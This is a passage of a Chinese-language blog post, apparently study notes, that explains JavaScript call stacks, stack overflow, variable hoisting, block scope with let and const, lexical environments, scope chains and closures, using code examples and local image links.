division(a,b)</span><br><span class="line">&#125;</span><br><span class="line">console.log(division(1,2))</span><br></pre></td></tr></table></figure><p>当执行时，就会抛出栈溢出错误，如下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013222533112.png" alt="image-20221013222533112"></p><p>从上图你可以看到，抛出的错误信息为：超过了最大栈调用大小（Maximum call stack size exceeded）。</p><p>那为什么会出现这个问题呢？这是因为当 JavaScript 引擎开始执行这段代码时，它首先调用函数 division，并创建执行上下文，压入栈中；然而，这个函数是<strong>递归的，并且没有任何终止条件</strong>，所以它会一直创建新的函数执行上下文，并反复将其压入栈中，但栈是有容量限制的，超过最大数量后就会出现栈溢出的错误。</p><p>理解了栈溢出原因后，你就可以使用一些方法来避免或者解决栈溢出的问题，比如把递归调用的形式改造成其他形式，或者使用加入定时器的方法来把当前任务拆分为其他很多小任务。</p><h3 id="总结-7"><a href="#总结-7" class="headerlink" title="总结"></a>总结</h3><p>好了，今天的内容就讲到这里，下面来总结下今天的内容。</p><ul><li>每调用一个函数，JavaScript 引擎会为其创建执行上下文，并把该执行上下文压入调用栈，然后 JavaScript 引擎开始执行函数代码。</li><li>如果在一个函数 A 中调用了另外一个函数 B，那么 JavaScript 引擎会为 B 函数创建执行上下文，并将 B 函数的执行上下文压入栈顶。</li><li>当前函数执行完毕后，JavaScript 引擎会将该函数的执行上下文弹出栈。</li><li>当分配的调用栈空间被占满时，会引发“堆栈溢出”问题。</li></ul><p>栈是一种非常重要的数据结构，不光应用在 JavaScript 语言中，其他的编程语言，如 C&#x2F;C++、Java、Python 等语言，在执行过程中也都使用了栈来管理函数之间的调用关系。所以栈是非常基础且重要的知识点，你必须得掌握。</p><h2 id="3-块级作用域：var-缺陷以及为什么要引入-let-和-const？"><a href="#3-块级作用域：var-缺陷以及为什么要引入-let-和-const？" class="headerlink" title="3. 块级作用域：var 缺陷以及为什么要引入 let 和 const？"></a>3. 块级作用域：var 缺陷以及为什么要引入 let 和 const？</h2><p>在前面[《变量提升：JavaScript 代码是按顺序执行的吗？》这篇文章中，我们已经讲解了 JavaScript 中变量提升的相关内容，<strong>正是由于 JavaScript 存在变量提升这种特性，从而导致了很多与直觉不符的代码，这也是 JavaScript 的一个重要设计缺陷</strong>。</p><p>虽然 ECMAScript6（以下简称 ES6）已经通过引入块级作用域并配合 let、const 关键字，来避开了这种设计缺陷，但是由于 JavaScript 需要保持向下兼容，所以变量提升在相当长一段时间内还会继续存在。这也加大了你理解概念的难度，因为既要理解新的机制，又要理解变量提升这套机制，关键这两套机制还是同时运行在“一套”系统中的。</p><p>但如果抛开 JavaScript 的底层去理解这些，那么你大概率会很难深入理解其概念。俗话说，“断病要断因，治病要治根”，所以为了便于你更好地理解和学习，今天我们这篇文章会先“<strong>探病因</strong>”——分析为什么在 JavaScript 中会存在变量提升，以及变量提升所带来的问题；然后再来“<strong>开药方</strong>”——介绍如何通过<strong>块级作用域并配合 let 和 const 关键字</strong>来修复这种缺陷。</p><h3 id="作用域（scope）"><a href="#作用域（scope）" class="headerlink" title="作用域（scope）"></a>作用域（scope）</h3><p>为什么 JavaScript 中会存在变量提升这个特性，而其他语言似乎都没有这个特性呢？要讲清楚这个问题，我们就得先从作用域讲起。</p><p><strong>作用域是指在程序中定义变量的区域，该位置决定了变量的生命周期。通俗地理解，作用域就是变量与函数的可访问范围，即作用域控制着变量和函数的可见性和生命周期。</strong></p><p>在 ES6 之前，ES 的作用域只有两种：全局作用域和函数作用域。</p><ul><li><strong>全局作用域</strong>中的对象在代码中的任何地方都能访问，其生命周期伴随着页面的生命周期。</li><li><strong>函数作用域</strong>就是在函数内部定义的变量或者函数，并且定义的变量或者函数只能在函数内部被访问。函数执行结束之后，函数内部定义的变量会被销毁。</li></ul><p>在 ES6 之前，JavaScript 只支持这两种作用域，相较而言，其他语言则都普遍支持<strong>块级作用域</strong>。块级作用域就是使用一对大括号包裹的一段代码，比如函数、判断语句、循环语句，甚至单独的一个{}都可以被看作是一个块级作用域。</p><p>为了更好地理解块级作用域，你可以参考下面的一些示例代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/if 块</span><br><span class="line">if(1)&#123;&#125;</span><br><span class="line"></span><br><span class="line">//while 块</span><br><span class="line">while(1)&#123;&#125;</span><br><span class="line"></span><br><span class="line">// 函数块</span><br><span class="line">function foo()&#123;</span><br><span class="line"></span><br><span class="line">//for 循环块</span><br><span class="line">for(let i = 0; i&lt;100; i++)&#123;&#125;</span><br><span class="line"></span><br><span class="line">// 单独一个块</span><br><span class="line">&#123;&#125;</span><br></pre></td></tr></table></figure><p>简单来讲，如果一种语言支持块级作用域，那么其代码块内部定义的变量在代码块外部是访问不到的，并且等该代码块中的代码执行完成之后，代码块中定义的变量会被销毁。你可以看下面这段 C 代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">char* myname = &quot; 极客时间 &quot;;</span><br><span class="line">void showName() &#123;</span><br><span class="line">  printf(&quot;%s \n&quot;,myname);</span><br><span class="line">  if(0)&#123;</span><br><span class="line">    char* myname = &quot; 极客邦 &quot;;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">   showName();</span><br><span class="line">   return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面这段 C 代码执行后，最终打印出来的是上面全局变量 myname 的值，之所以这样，是因为 C 语言是支持块级作用域的，所以 if 块里面定义的变量是不能被 if 块外面的语句访问到的。</p><p>和 Java、C&#x2F;C++ 不同，<strong>ES6 之前是不支持块级作用域的</strong>，因为当初设计这门语言的时候，并没有想到 JavaScript 会火起来，所以只是按照最简单的方式来设计。没有了块级作用域，再把作用域内部的变量统一提升无疑是最快速、最简单的设计，不过这也直接导致了函数中的变量无论是在哪里声明的，在编译阶段都会被提取到执行上下文的变量环境中，所以这些变量在整个函数体内部的任何地方都是能被访问的，这也就是 JavaScript 中的变量提升。</p><h3 id="变量提升所带来的问题"><a href="#变量提升所带来的问题" class="headerlink" title="变量提升所带来的问题"></a>变量提升所带来的问题</h3><p>由于变量提升作用，使用 JavaScript 来编写和其他语言相同逻辑的代码，都有可能会导致不一样的执行结果。那为什么会出现这种情况呢？主要有以下两种原因。</p><h4 id="1-变量容易在不被察觉的情况下被覆盖掉"><a href="#1-变量容易在不被察觉的情况下被覆盖掉" class="headerlink" title="1. 变量容易在不被察觉的情况下被覆盖掉"></a>1. 变量容易在不被察觉的情况下被覆盖掉</h4><p>比如我们重新使用 JavaScript 来实现上面那段 C 代码，实现后的 JavaScript 代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">var myname = &quot; 极客时间 &quot;</span><br><span class="line">function showName()&#123;</span><br><span class="line">  console.log(myname);</span><br><span class="line">  if(0)&#123;</span><br><span class="line">   var myname = &quot; 极客邦 &quot;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(myname);</span><br><span class="line">&#125;</span><br><span class="line">showName()</span><br></pre></td></tr></table></figure><p>执行上面这段代码，打印出来的是 undefined，而并没有像前面 C 代码那样打印出来“极客时间”的字符串。为什么输出的内容是 undefined 呢？我们再来分析一下。</p><p>首先当刚执行到 showName 函数调用时，执行上下文和调用栈的状态是怎样的？具体分析过程你可以回顾《调用栈：为什么 JavaScript 代码会出现栈溢出？》这篇文章的分析过程，这里我就直接展示出来了，最终的调用栈状态如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013224640059.png" alt="image-20221013224640059"></p><p>showName 函数的执行上下文创建后，JavaScript 引擎便开始执行 showName 函数内部的代码了。首先执行的是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">console.log(myname);</span><br><span class="line">复制代码</span><br></pre></td></tr></table></figure><p>执行这段代码需要使用变量 myname，结合上面的调用栈状态图，你可以看到这里有两个 myname 变量：一个在全局执行上下文中，其值是“极客时间”；另外一个在 showName 函数的执行上下文中，其值是 undefined。那么到底该使用哪个呢？</p><p>相信做过 JavaScript 开发的同学都能轻松回答出来答案：“当然是<strong>先使用函数执行上下文里面的变量</strong>啦！”的确是这样，这是因为在函数执行过程中，JavaScript 会优先从当前的执行上下文中查找变量，由于变量提升，当前的执行上下文中就包含了变量 myname，而值是 undefined，所以获取到的 myname 的值就是 undefined。</p><p>这输出的结果和其他大部分支持块级作用域的语言都不一样，比如上面 C 语言输出的就是全局变量，所以这会很容易造成误解，特别是在你会一些其他语言的基础之上，再来学习 JavaScript，你会觉得这种结果很不自然。</p><h4 id="2-本应销毁的变量没有被销毁"><a href="#2-本应销毁的变量没有被销毁" class="headerlink" title="2. 本应销毁的变量没有被销毁"></a>2. 本应销毁的变量没有被销毁</h4><p>接下来我们再来看下面这段让人误解更大的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">  for (var i = 0; i &lt; 7; i++) &#123;</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(i);</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>如果你使用 C 语言或者其他的大部分语言实现类似代码，在 for 循环结束之后，i 就已经被销毁了，但是在 JavaScript 代码中，i 的值并未被销毁，所以最后打印出来的是 7。</p><p>这同样也是由变量提升而导致的，在创建执行上下文阶段，变量 i 就已经被提升了，所以当 for 循环结束之后，变量 i 并没有被销毁。</p><p>这依旧和其他支持块级作用域的语言表现是不一致的，所以必然会给一些人造成误解。</p><h3 id="ES6-是如何解决变量提升带来的缺陷"><a href="#ES6-是如何解决变量提升带来的缺陷" class="headerlink" title="ES6 是如何解决变量提升带来的缺陷"></a>ES6 是如何解决变量提升带来的缺陷</h3><p>上面我们介绍了变量提升而带来的一系列问题，为了解决这些问题，<strong>ES6 引入了 let 和 const 关键字</strong>，从而使 JavaScript 也能像其他语言一样拥有了块级作用域。</p><p>关于 let 和 const 的用法，你可以参考下面代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">let x = 5</span><br><span class="line">const y = 6</span><br><span class="line">x = 7</span><br><span class="line">y = 9 // 报错，const 声明的变量不可以修改</span><br></pre></td></tr></table></figure><p>从这段代码你可以看出来，两者之间的区别是，使用 let 关键字声明的变量是可以被改变的，而使用 const 声明的变量其值是不可以被改变的。但不管怎样，两者都可以生成块级作用域，为了简单起见，在下面的代码中，我统一使用 let 关键字来演示。</p><p>那么接下来，我们就通过实际的例子来分析下，ES6 是如何通过块级作用域来解决上面的问题的？</p><p>你可以先参考下面这段存在变量提升的代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function varTest() &#123;</span><br><span class="line">  var x = 1;</span><br><span class="line">  if (true) &#123;</span><br><span class="line">    var x = 2;  // 同样的变量!</span><br><span class="line">    console.log(x);  // 2</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(x);  // 2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这段代码中，有两个地方都定义了变量 x，第一个地方在函数块的顶部，第二个地方在 if 块的内部，由于 var 的作用范围是整个函数，所以在编译阶段，会生成如下的执行上下文：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013225748341.png" alt="image-20221013225748341"></p><p>从执行上下文的变量环境中可以看出，最终只生成了一个变量 x，函数体内所有对 x 的赋值操作都会直接改变变量环境中的 x 值。</p><p>所以上述代码最后通过 console.log(x) 输出的是 2，而对于相同逻辑的代码，其他语言最后一步输出的值应该是 1，因为在 if 块里面的声明不应该影响到块外面的变量。</p><p>既然支持块级作用域和不支持块级作用域的代码执行逻辑是不一样的，那么接下来我们就来改造上面的代码，让其支持块级作用域。</p><p>这个改造过程其实很简单，只需要把 var 关键字替换为 let 关键字，改造后的代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function letTest() &#123;</span><br><span class="line">  let x = 1;</span><br><span class="line">  if (true) &#123;</span><br><span class="line">    let x = 2;  // 不同的变量</span><br><span class="line">    console.log(x);  // 2</span><br><span class="line">  &#125;</span><br><span class="line">  console.log(x);  // 1</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行这段代码，其输出结果就和我们的预期是一致的。这是因为 let 关键字是支持块级作用域的，所以在编译阶段，JavaScript 引擎并不会把 if 块中通过 let 声明的变量存放到变量环境中，这也就意味着在 if 块通过 let 声明的关键字，并不会提升到全函数可见。所以在 if 块之内打印出来的值是 2，跳出语块之后，打印出来的值就是 1 了。这种就非常<strong>符合我们的编程习惯了：作用块内声明的变量不影响块外面的变量</strong>。</p><h3 id="JavaScript-是如何支持块级作用域的"><a href="#JavaScript-是如何支持块级作用域的" class="headerlink" title="JavaScript 是如何支持块级作用域的"></a>JavaScript 是如何支持块级作用域的</h3><p>现在你知道了 ES 可以通过使用 let 或者 const 关键字来实现块级作用域，不过你是否有过这样的疑问：“在同一段代码中，ES6 是如何做到既要支持变量提升的特性，又要支持块级作用域的呢？”</p><p>那么接下来，我们就要<strong>站在执行上下文的角度</strong>来揭开答案。</p><p>你已经知道 JavaScript 引擎是通过变量环境实现函数级作用域的，那么 ES6 又是如何在函数级作用域的基础之上，实现对块级作用域的支持呢？你可以先看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo()&#123;</span><br><span class="line">    var a = 1</span><br><span class="line">    let b = 2</span><br><span class="line">    &#123;</span><br><span class="line">      let b = 3</span><br><span class="line">      var c = 4</span><br><span class="line">      let d = 5</span><br><span class="line">      console.log(a)</span><br><span class="line">      console.log(b)</span><br><span class="line">    &#125;</span><br><span class="line">    console.log(b)</span><br><span class="line">    console.log(c)</span><br><span class="line">    console.log(d)</span><br><span class="line">&#125;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>当执行上面这段代码的时候，JavaScript 引擎会先对其进行编译并创建执行上下文，然后再按照顺序执行代码，关于如何创建执行上下文我们在前面的文章中已经分析过了，但是现在的情况有点不一样，我们引入了 let 关键字，let 关键字会创建块级作用域，那么 let 关键字是如何影响执行上下文的呢？</p><p>接下来我们就来一步步分析上面这段代码的执行流程。</p><p><strong>第一步是编译并创建执行上下文</strong>，下面是我画出来的执行上下文示意图，你可以参考下：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013231109876.png" alt="image-20221013231109876"></p><p>通过上图，我们可以得出以下结论：</p><ul><li>函数内部通过 var 声明的变量，在编译阶段全都被存放到<strong>变量环境</strong>里面了。</li><li>通过 let 声明的变量，在编译阶段会被存放到<strong>词法环境（Lexical Environment）</strong>中。</li><li>在函数的作用域内部，通过 let 声明的变量并没有被存放到词法环境中。</li></ul><p>接下来，<strong>第二步继续执行代码</strong>，当执行到代码块里面时，变量环境中 a 的值已经被设置成了 1，词法环境中 b 的值已经被设置成了 2，这时候函数的执行上下文就如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013231122795.png" alt="image-20221013231122795"></p><p>从图中可以看出，当进入函数的作用域块时，作用域块中通过 let 声明的变量，会被存放在词法环境的一个单独的区域中，这个区域中的变量并不影响作用域块外面的变量，比如在作用域外面声明了变量 b，在该作用域块内部也声明了变量 b，当执行到作用域内部时，它们都是独立的存在。</p><p>其实，在词法环境内部，维护了一个小型栈结构，栈底是函数最外层的变量，进入一个作用域块后，就会把该作用域块内部的变量压到栈顶；当作用域执行完成之后，该作用域的信息就会从栈顶弹出，这就是词法环境的结构。需要注意下，我这里所讲的变量是指通过 let 或者 const 声明的变量。</p><p>再接下来，当执行到作用域块中的<code>console.log(a)</code>这行代码时，就需要在词法环境和变量环境中查找变量 a 的值了，具体查找方式是：沿着词法环境的栈顶向下查询，如果在词法环境中的某个块中查找到了，就直接返回给 JavaScript 引擎，如果没有查找到，那么继续在变量环境中查找。</p><p>这样一个变量查找过程就完成了，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013231131439.png" alt="image-20221013231131439"></p><p>从上图你可以清晰地看出变量查找流程，不过要完整理解查找变量或者查找函数的流程，就涉及到作用域链了，这个我们会在下篇文章中做详细介绍。</p><p>当作用域块执行结束之后，其内部定义的变量就会从词法环境的栈顶弹出，最终执行上下文如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221013231139494.png" alt="image-20221013231139494"></p><p>通过上面的分析，想必你已经理解了词法环境的结构和工作机制，块级作用域就是通过词法环境的栈结构来实现的，而变量提升是通过变量环境来实现，通过这两者的结合，JavaScript 引擎也就同时支持了变量提升和块级作用域了。</p><h3 id="总结-8"><a href="#总结-8" class="headerlink" title="总结"></a>总结</h3><p>好了，今天的内容就讲到这里，下面我来简单总结下今天的内容。</p><p>由于 JavaScript 的变量提升存在着变量覆盖、变量污染等设计缺陷，所以 ES6 引入了块级作用域关键字来解决这些问题。</p><p>之后我们还通过对变量环境和词法环境的介绍，分析了 JavaScript 引擎是如何同时支持变量提升和块级作用域的。</p><p>既然聊到了作用域，那最后我们再简单聊下编程语言吧。经常有人争论什么编程语言是世界上最好的语言，但如果站在语言本身来说，我觉得这种争论没有意义，因为语言是工具，而工具是用来创造价值的，至于能否创造价值或创造多大价值不完全由语言本身的特性决定。这么说吧，即便一门设计不那么好的语言，它也可能拥有非常好的生态，比如有完善的框架、非常多的落地应用，又或者能够给开发者带来更多的回报，这些都是评判因素。</p><p>如果站在语言层面来谈，每种语言其实都是在相互借鉴对方的优势，协同进化，比如 JavaScript 引进了作用域、迭代器和协程，其底层虚拟机的实现和 Java、Python 又是非常相似，也就是说如果你理解了 JavaScript 协程和 JavaScript 中的虚拟机，其实你也就理解了 Java、Python 中的协程和虚拟机的实现机制。</p><p>所以说，语言本身好坏不重要，重要的是能为开发者创造价值。</p><h2 id="4-作用域链和闭包-：代码中出现相同的变量，JavaScript-引擎是如何选择的？"><a href="#4-作用域链和闭包-：代码中出现相同的变量，JavaScript-引擎是如何选择的？" class="headerlink" title="4. 作用域链和闭包 ：代码中出现相同的变量，JavaScript 引擎是如何选择的？"></a>4. 作用域链和闭包 ：代码中出现相同的变量，JavaScript 引擎是如何选择的？</h2><p>在上一篇文章中我们讲到了什么是作用域，以及 ES6 是如何通过变量环境和词法环境来同时支持变量提升和块级作用域，在最后我们也提到了如何通过词法环境和变量环境来查找变量，这其中就涉及到<strong>作用域链</strong>的概念。</p><p>理解作用域链是理解闭包的基础，而闭包在 JavaScript 中几乎无处不在，同时作用域和作用域链还是所有编程语言的基础。所以，如果你想学透一门语言，作用域和作用域链一定是绕不开的。</p><p>那今天我们就来聊聊<strong>什么是作用域链</strong>，并通过作用域链再来讲讲<strong>什么是闭包</strong>。</p><p>首先我们来看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function bar() &#123;</span><br><span class="line">    console.log(myName)</span><br><span class="line">&#125;</span><br><span class="line">function foo() &#123;</span><br><span class="line">    var myName = &quot; 极客邦 &quot;</span><br><span class="line">    bar()</span><br><span class="line">&#125;</span><br><span class="line">var myName = &quot; 极客时间 &quot;</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>你觉得这段代码中的 bar 函数和 foo 函数打印出来的内容是什么？这就要分析下这两段代码的执行流程。</p><p>通过前面几篇文章的学习，想必你已经知道了如何通过执行上下文来分析代码的执行流程了。那么当这段代码执行到 bar 函数内部时，其调用栈的状态图如下所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014084642985.png" alt="image-20221014084642985"></p><p>从图中可以看出，全局执行上下文和 foo 函数的执行上下文中都包含变量 myName，那 bar 函数里面 myName 的值到底该选择哪个呢？</p><p>也许你的第一反应是按照调用栈的顺序来查找变量，查找方式如下：</p><ol><li>先查找栈顶是否存在 myName 变量，但是这里没有，所以接着往下查找 foo 函数中的变量。</li><li>在 foo 函数中查找到了 myName 变量，这时候就使用 foo 函数中的 myName。</li></ol><p>如果按照这种方式来查找变量，那么最终执行 bar 函数打印出来的结果就应该是“极客邦”。但实际情况并非如此，如果你试着执行上述代码，你会发现打印出来的结果是“极客时间”。为什么会是这种情况呢？要解释清楚这个问题，那么你就需要先搞清楚作用域链了。</p><h3 id="作用域链"><a href="#作用域链" class="headerlink" title="作用域链"></a>作用域链</h3><p>关于作用域链，很多人会感觉费解，但如果你理解了调用栈、执行上下文、词法环境、变量环境等概念，那么你理解起来作用域链也会很容易。所以很是建议你结合前几篇文章将上面那几个概念学习透彻。</p><p>其实在每个执行上下文的变量环境中，都包含了一个外部引用，用来指向外部的执行上下文，我们把这个外部引用称为<strong>outer</strong>。</p><p>当一段代码使用了一个变量时，JavaScript 引擎首先会在“当前的执行上下文”中查找该变量，<br>比如上面那段代码在查找 myName 变量时，如果在当前的变量环境中没有查找到，那么 JavaScript 引擎会继续在 outer 所指向的执行上下文中查找。为了直观理解，你可以看下面这张图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014084938867.png" alt="image-20221014084938867"></p><p>从图中可以看出，bar 函数和 foo 函数的 outer 都是指向全局上下文的，这也就意味着如果在 bar 函数或者 foo 函数中使用了外部变量，那么 JavaScript 引擎会去全局执行上下文中查找。我们把这个查找的链条就称为<strong>作用域链</strong>。</p><p>现在你知道变量是通过作用域链来查找的了，不过还有一个疑问没有解开，foo 函数调用的 bar 函数，那为什么 bar 函数的外部引用是全局执行上下文，而不是 foo 函数的执行上下文？</p><p>要回答这个问题，你还需要知道什么是<strong>词法作用域</strong>。这是因为在 JavaScript 执行过程中，其作用域链是由词法作用域决定的。</p><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><p><strong>词法作用域就是指作用域是由代码中函数声明的位置来决定的，所以词法作用域是静态的作用域，通过它就能够预测代码在执行过程中如何查找标识符。</strong></p><p>这么讲可能不太好理解，你可以看下面这张图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014085122435.png" alt="image-20221014085122435"></p><p>从图中可以看出，词法作用域就是根据代码的位置来决定的，其中 main 函数包含了 bar 函数，bar 函数中包含了 foo 函数，因为 JavaScript 作用域链是由词法作用域决定的，所以整个词法作用域链的顺序是：foo 函数作用域—&gt;bar 函数作用域—&gt;main 函数作用域—&gt; 全局作用域。</p><p>了解了词法作用域以及 JavaScript 中的作用域链，我们再回过头来看看上面的那个问题：在开头那段代码中，foo 函数调用了 bar 函数，那为什么 bar 函数的外部引用是全局执行上下文，而不是 foo 函数的执行上下文?</p><p>这是因为根据词法作用域，foo 和 bar 的上级作用域都是全局作用域，所以如果 foo 或者 bar 函数使用了一个它们没有定义的变量，那么它们会到全局作用域去查找。也就是说，<strong>词法作用域是代码阶段就决定好的，和函数是怎么调用的没有关系</strong>。</p><h3 id="块级作用域中的变量查找"><a href="#块级作用域中的变量查找" class="headerlink" title="块级作用域中的变量查找"></a>块级作用域中的变量查找</h3><p>前面我们通过全局作用域和函数级作用域来分析了作用域链，那接下来我们再来看看块级作用域中变量是如何查找的？在编写代码的时候，如果你使用了一个在当前作用域中不存在的变量，这时 JavaScript 引擎就需要按照作用域链在其他作用域中查找该变量，如果你不了解该过程，那就会有很大概率写出不稳定的代码。</p><p>我们还是先看下面这段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function bar() &#123;</span><br><span class="line">    var myName = &quot; 极客世界 &quot;</span><br><span class="line">    let test1 = 100</span><br><span class="line">    if (1) &#123;</span><br><span class="line">        let myName = &quot;Chrome 浏览器 &quot;</span><br><span class="line">        console.log(test)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function foo() &#123;</span><br><span class="line">    var myName = &quot; 极客邦 &quot;</span><br><span class="line">    let test = 2</span><br><span class="line">    &#123;</span><br><span class="line">        let test = 3</span><br><span class="line">        bar()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">var myName = &quot; 极客时间 &quot;</span><br><span class="line">let myAge = 10</span><br><span class="line">let test = 1</span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>你可以自己先分析下这段代码的执行流程，看看能否分析出来执行结果。</p><p>要想得出其执行结果，那接下来我们就得站在作用域链和词法环境的角度来分析下其执行过程。</p><p>在上篇文章中我们已经介绍过了，ES6 是支持块级作用域的，当执行到代码块时，如果代码块中有 let 或者 const 声明的变量，那么变量就会存放到该函数的词法环境中。对于上面这段代码，当执行到 bar 函数内部的 if 语句块时，其调用栈的情况如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014085848127.png" alt="image-20221014085848127"></p><p>现在是执行到 bar 函数的 if 语块之内，需要打印出来变量 test，那么就需要查找到 test 变量的值，其查找过程我已经在上图中使用序号 1、2、3、4、5 标记出来了。</p><p>下面我就来解释下这个过程。首先是在 bar 函数的执行上下文中查找，但因为 bar 函数的执行上下文中没有定义 test 变量，所以根据词法作用域的规则，下一步就在 bar 函数的外部作用域中查找，也就是全局作用域。</p><p>至于单个执行上下文中如何查找变量，我在上一篇文章中已经做了介绍，这里就不重复了。</p><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><p>了解了作用域链，接着我们就可以来聊聊闭包了。关于闭包，理解起来可能会是一道坎，特别是在你不太熟悉 JavaScript 这门语言的时候，接触闭包很可能会让你产生一些挫败感，因为你很难通过理解背后的原理来彻底理解闭包，从而导致学习过程中似乎总是似懂非懂。最要命的是，JavaScript 代码中还总是充斥着大量的闭包代码。</p><p>但理解了变量环境、词法环境和作用域链等概念，那接下来你再理解什么是 JavaScript 中的闭包就容易多了。这里你可以结合下面这段代码来理解什么是闭包：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    var myName = &quot; 极客时间 &quot;</span><br><span class="line">    let test1 = 1</span><br><span class="line">    const test2 = 2</span><br><span class="line">    var innerBar = &#123;</span><br><span class="line">        getName:function()&#123;</span><br><span class="line">            console.log(test1)</span><br><span class="line">            return myName</span><br><span class="line">        &#125;,</span><br><span class="line">        setName:function(newName)&#123;</span><br><span class="line">            myName = newName</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return innerBar</span><br><span class="line">&#125;</span><br><span class="line">var bar = foo()</span><br><span class="line">bar.setName(&quot; 极客邦 &quot;)</span><br><span class="line">bar.getName()</span><br><span class="line">console.log(bar.getName())</span><br></pre></td></tr></table></figure><p>首先我们看看当执行到 foo 函数内部的<code>return innerBar</code>这行代码时调用栈的情况，你可以参考下图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014091327200.png" alt="image-20221014091327200"></p><p>从上面的代码可以看出，innerBar 是一个对象，包含了 getName 和 setName 的两个方法（通常我们把对象内部的函数称为方法）。你可以看到，这两个方法都是在 foo 函数内部定义的，并且这两个方法内部都使用了 myName 和 test1 两个变量。</p><p><strong>根据词法作用域的规则，内部函数 getName 和 setName 总是可以访问它们的外部函数 foo 中的变量</strong>，所以当 innerBar 对象返回给全局变量 bar 时，虽然 foo 函数已经执行结束，但是 getName 和 setName 函数依然可以使用 foo 函数中的变量 myName 和 test1。所以当 foo 函数执行完成之后，其整个调用栈的状态如下图所示：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014091339374.png" alt="image-20221014091339374"></p><p>从上图可以看出，foo 函数执行完成之后，其执行上下文从栈顶弹出了，但是由于返回的 setName 和 getName 方法中使用了 foo 函数内部的变量 myName 和 test1，所以这两个变量依然保存在内存中。这像极了 setName 和 getName 方法背的一个专属背包，无论在哪里调用了 setName 和 getName 方法，它们都会背着这个 foo 函数的专属背包。</p><p>之所以是<strong>专属</strong>背包，是因为除了 setName 和 getName 函数之外，其他任何地方都是无法访问该背包的，我们就可以把这个背包称为 foo 函数的<strong>闭包</strong>。</p><p>好了，现在我们终于可以给闭包一个正式的定义了。<strong>在 JavaScript 中，根据词法作用域的规则，内部函数总是可以访问其外部函数中声明的变量，当通过调用一个外部函数返回一个内部函数后，即使该外部函数已经执行结束了，但是内部函数引用外部函数的变量依然保存在内存中，我们就把这些变量的集合称为闭包。比如外部函数是 foo，那么这些变量的集合就称为 foo 函数的闭包</strong>。</p><p>那这些闭包是如何使用的呢？当执行到 bar.setName 方法中的<code>myName = &quot;极客邦&quot;</code>这句代码时，JavaScript 引擎会沿着“当前执行上下文–&gt;foo 函数闭包–&gt; 全局执行上下文”的顺序来查找 myName 变量，你可以参考下面的调用栈状态图：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014091351809.png" alt="image-20221014091351809"></p><p>从图中可以看出，setName 的执行上下文中没有 myName 变量，foo 函数的闭包中包含了变量 myName，所以调用 setName 时，会修改 foo 闭包中的 myName 变量的值。</p><p>同样的流程，当调用 bar.getName 的时候，所访问的变量 myName 也是位于 foo 函数闭包中的。</p><p>你也可以通过“开发者工具”来看看闭包的情况，打开 Chrome 的“开发者工具”，在 bar 函数任意地方打上断点，然后刷新页面，可以看到如下内容：</p><p><img src="C:\Users\24657\AppData\Roaming\Typora\typora-user-images\image-20221014091402426.png" alt="image-20221014091402426"></p><p>从图中可以看出来，当调用 bar.getName 的时候，右边 Scope 项就体现出了作用域链的情况：Local 就是当前的 getName 函数的作用域，Closure(foo) 是指 foo 函数的闭包，最下面的 Global 就是指全局作用域，从“Local–&gt;Closure(foo)–&gt;Global”就是一个完整的作用域链。</p><p>所以说，你以后也可以通过 Scope 来查看实际代码作用域链的情况，这样调试代码也会比较方便。</p><h3 id="闭包是怎么回收的"><a href="#闭包是怎么回收的" class="headerlink" 